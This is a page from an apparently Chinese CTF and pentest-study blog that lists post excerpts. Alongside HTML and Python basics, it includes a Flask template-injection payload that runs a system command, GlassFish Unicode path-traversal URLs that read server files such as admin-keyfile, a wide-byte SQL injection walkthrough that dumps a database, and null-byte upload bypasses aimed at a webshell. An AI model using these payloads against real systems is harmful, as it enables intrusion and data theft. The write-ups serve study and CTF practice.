<!DOCTYPE html>
<html lang="zh_CN">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<link rel="alternate" href="/atom.xml" title="Saltneko"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="http://yoursite.com/page/4/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":"app_id:sB2SP6AaImiT4x3A8ms2stxj-gzGzoHsz app_key:69kbIXu3HeNAasY9m6mbX6fa","toc":true,"fancybox":true,"pjax":"","latex":false};
</script>

    <title>Saltneko</title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Saltneko</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories
          </li>
      </a><a href="/link/">
        <li class="mobile-menu-item">Link
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Saltneko</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/categories/">
            Categories
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/link/">
            Link
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><section id="posts" class="posts"><article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/27/Bugku-Misc/">Bugku-Misc</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-27
        </span><span class="post-category">
            <a href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a>
            <a href="/categories/%E6%9D%82%E9%A1%B9/WP/">WP</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h3 id="签到题"><a href="#签到题" class="headerlink" title="#签到题"></a>#签到题</h3><p>扫描微信二维码加关注后可得<br>flag{BugKu-Sec-pwn!}</p>
          <div class="read-more">
            <a href="/2019/10/27/Bugku-Misc/" class="read-more-link">Read more..</a>
          </div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/27/Bootstrap/">Bootstrap</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-27
        </span><span class="post-category">
            <a href="/categories/Web/">Web</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h3 id="Bootstrap框架"><a href="#Bootstrap框架" class="headerlink" title="#Bootstrap框架"></a>#Bootstrap框架</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&quot;//fonts.gdgdocs.org/css?family=Lobster&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>添加在html开头<br>然后把所有的HTML内容放在class为container-fluid的div下</p>
          <div class="read-more">
            <a href="/2019/10/27/Bootstrap/" class="read-more-link">Read more..</a>
          </div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/27/HTML-CSS/">HTML&CSS</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-27
        </span><span class="post-category">
            <a href="/categories/Web/">Web</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h3 id="预格式文本"><a href="#预格式文本" class="headerlink" title="#预格式文本"></a>#预格式文本</h3><p>保留输入的文本格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">这是</span><br><span class="line">预格式文本。</span><br><span class="line">它保留了      空格</span><br><span class="line">和换行。</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
<h3 id="缩写和首字母缩写"><a href="#缩写和首字母缩写" class="headerlink" title="#缩写和首字母缩写"></a>#缩写和首字母缩写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;</span><br></pre></td></tr></table></figure>
          <div class="read-more">
            <a href="/2019/10/27/HTML-CSS/" class="read-more-link">Read more..</a>
          </div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/27/%E6%88%AA%E6%96%AD%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">截断上传漏洞</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-27
        </span><span class="post-category">
            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="#漏洞原理"></a>#漏洞原理</h3><p>因为char(0)表示的ascll字符是null，当程序输出包含chr(0)变量时，chr(0)后面的数据会被截断，后面的数据直接忽略，导致漏洞产生。</p>
<h3 id="0x00截断"><a href="#0x00截断" class="headerlink" title="#0x00截断"></a>#0x00截断</h3><p>0x00截断，00截断是将上传文件名或路径名中使用ascll码值为0的字符（也就是null）来进行截断<br>1）BP抓包<br>2）在/Upload/后面加一个空格，点开hex，将其对应的20改成00即可，就可以绕过后缀名的过滤，从而得到webshell</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="#%00截断"></a>#%00截断</h3><p>%00一般用在URL中用于截断url来进行文件包含<br>1）BP抓包<br>2）在filename后面加%00.jpg，先绕过后缀上传，然后利用burp的urldecode功能，其实和/00截断将hex20变成00一样，效果一样，两种方法都可以拿webshell</p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/27/Python%E7%9A%84CMD%E8%BF%90%E8%A1%8C%E5%92%8Chexo%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">Python的CMD运行和hexo的环境配置</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-27
        </span><span class="post-category">
            <a href="/categories/%E6%95%99%E7%A8%8B/">教程</a>
            </span>
        </div>
    </header>

    <div class="post-content"><p>写在最前面：大概就是自己脑子一抽明明在有pycharm的情况下硬耗着想用CMD来运行Py脚本（明明连python2/3版本都不好切换 大概觉得用命令行比较帅（x</p>
<p>步骤：<br>Win键-&gt;设置-&gt;搜索系统属性-&gt;高级-&gt;环境变量-&gt;在Path中加入python的路径<br>注意的是不同的路径间用英文的;分开</p>
          <div class="read-more">
            <a href="/2019/10/27/Python%E7%9A%84CMD%E8%BF%90%E8%A1%8C%E5%92%8Chexo%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" class="read-more-link">Read more..</a>
          </div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/23/Python-1/">Python(1)</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-23
        </span><span class="post-category">
            <a href="/categories/Python/">Python</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h3 id="输出"><a href="#输出" class="headerlink" title="#输出"></a>#输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/user/bin/env python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">print&quot;hello&quot;</span><br></pre></td></tr></table></figure>
<p>-第一行就是指出这个脚本文件要用什么可执行程序去运行它，第二行是让我们的程序支持中文<br>-python3中为print(“hello”)</p>
          <div class="read-more">
            <a href="/2019/10/23/Python-1/" class="read-more-link">Read more..</a>
          </div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/23/XNUCA/">XNUCA</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-23
        </span><span class="post-category">
            <a href="/categories/WP/">WP</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h3 id="Md5"><a href="#Md5" class="headerlink" title="#Md5"></a>#Md5</h3><p>构造username=admin%c2使用get传参<br>题目中提到了客户端为utf8且数据库为latin1<br>*get传参的基本姿势 XXX.php？xxxx=xxxxx</p>
<p>#Flask</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python模板注入</span><br><span class="line">http://711a4f6c6d186da9ab08ce8b281515b3.xnuca.cn/&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[115](&apos;ls /&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>相当于调用popen函数，可执行系统命令。<br>以上为大佬的WP</p>
<h3 id="相关链接："><a href="#相关链接：" class="headerlink" title="#相关链接："></a>#相关链接：</h3><p>任意文件读取POC（模板注入）<a href="http://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">http://www.cnblogs.com/tyomcat/p/5440488.html</a><br>模板注入 <a href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank" rel="noopener">https://nvisium.com/blog/2015/12/07/injecting-flask/</a><br>沙盒逃逸 <a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="noopener">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a> python</p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/23/GlassFish/">GlassFish</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-23
        </span><span class="post-category">
            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
            </span>
        </div>
    </header>

    <div class="post-content"><p>#实质<br>unicode编码缺陷导致同一代码的多重含义，导致操作系统对代码的错误解析。典型案例：%c0%ae会被识别为./<br>参考：<a href="https://www.owasp.org/index.php/Canonicalization,_locale_and_Unicode#Description" target="_blank" rel="noopener">https://www.owasp.org/index.php/Canonicalization,_locale_and_Unicode#Description</a></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="#POC"></a>#POC</h3><p><code>…/%c0%ae%c0%ae/%c0%ae%c0%ae/……</code><br>可以用来读取任意文件<br>某漏洞点：<br>构造 <a href="http://xxx.xx.xxx.xxx:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/" target="_blank" rel="noopener">http://xxx.xx.xxx.xxx:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</a></p>
<p>再访问 <a href="http://xxx.xx.xxx.xxx:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/Users/Administrator/Desktop/setup.nsi" target="_blank" rel="noopener">http://xxx.xx.xxx.xxx:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/Users/Administrator/Desktop/setup.nsi</a></p>
<p>其余案例：<br><a href="http://192.168.147.148:4848/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile" target="_blank" rel="noopener">http://192.168.147.148:4848/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile</a></p>
<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="#修复方法"></a>#修复方法</h3><p>过滤 unicode解码后的字符串,防止出现<code>.</code> <code>/</code>;</p>
<h3 id="网站"><a href="#网站" class="headerlink" title="#网站"></a>#网站</h3><p>查询IP或域名 <a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/23/%E5%AD%A6%E6%9C%AF%E5%AE%89%E5%85%A8/">学术安全</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-23
        </span><span class="post-category">
            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h3 id="多host头"><a href="#多host头" class="headerlink" title="#多host头"></a>#多host头</h3><p>发送带有多 Host 的http 请求，downstream 与 upstream 可能理解成不同的 host地址，此情况出现条件较为复杂</p>
<h3 id="Host头增加前后空格"><a href="#Host头增加前后空格" class="headerlink" title="#Host头增加前后空格"></a>#Host头增加前后空格</h3><p>不同系统对空格理解不一致，歧义再次产生<br>request uri是绝对路径</p>
<h3 id="绝对路径被当作相对路径解析"><a href="#绝对路径被当作相对路径解析" class="headerlink" title="#绝对路径被当作相对路径解析"></a>#绝对路径被当作相对路径解析</h3><p>当Absoult-URL与Host同时出现时，除了akamai大多数遵循RFC<br>造成攻击</p>
          <div class="read-more">
            <a href="/2019/10/23/%E5%AD%A6%E6%9C%AF%E5%AE%89%E5%85%A8/" class="read-more-link">Read more..</a>
          </div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2019/10/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%89%8B%E6%B3%A8/">记一次手注</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-10-23
        </span><span class="post-category">
            <a href="/categories/SQL/">SQL</a>
            <a href="/categories/SQL/Web/">Web</a>
            </span>
        </div>
    </header>

    <div class="post-content"><p>手注爆库用户信息 题目来源NJUPT平台</p>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="#步骤"></a>#步骤</h3><p>题目来自NJUPT平台 <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a><br>1.<code>id=2</code> 得到Tips：<code>gbk_sql_injection</code>宽字节注入<br>2.<code>id=%df%27 or 1 = 1%23 your sql:select id,title from news where id = ‘運’ or 1 = 1#’</code><br>3.<br><code>id=%df%27 union select 1,database() from news%23</code>爆出库名 <code>sae-chinalover</code>/<br><code>id=%df%27 and 1=2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1--+%23</code>也可以 然后<code>sae-chinalover</code>十六进制转换为 <code>0x7361652D6368696E616C6F766572</code><br>4.<code>id=%df%27 and 1=2 union select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x7361652D6368696E616C6F766572%23</code><br>爆出表名 <code>ctf</code>,<code>ctf2</code>,<code>ctf3</code>,<code>ctf4</code>,<code>news</code><br>十六进制转换分别为<code>0x637466</code>，<code>0x63746632</code>，<code>0x63746633</code>，<code>0x63746634</code>，<code>0x6E657773</code><br>5.<code>id=%df%27 and 1=2 union select 1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x637466%23/0x63746632/0x63746633/0x63746634/0x6E657773</code>最后在表<code>ctf4</code>中得到<code>flag</code>字段<br>6.<br><code>id=%df%27 and 1=2 union select 1,group_concate(flag) from ctf4</code>得到Flag：nctf{gbk_3sqli}</p>
          <div class="read-more">
            <a href="/2019/10/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%89%8B%E6%B3%A8/" class="read-more-link">Read more..</a>
          </div>
        </div></article>
      <nav class="pagination"><a class="prev" href="/page/3/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text">Prev</span>
      </a>
    <a class="next" href="/page/5/">
        <span class="next-text">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></section></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:1281714262@qq.com" target="_blank" rel="noopener" class="iconfont icon-email" title="email"></a>
        <a href="https://github.com/SaLTNEko" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2020<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Salt</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
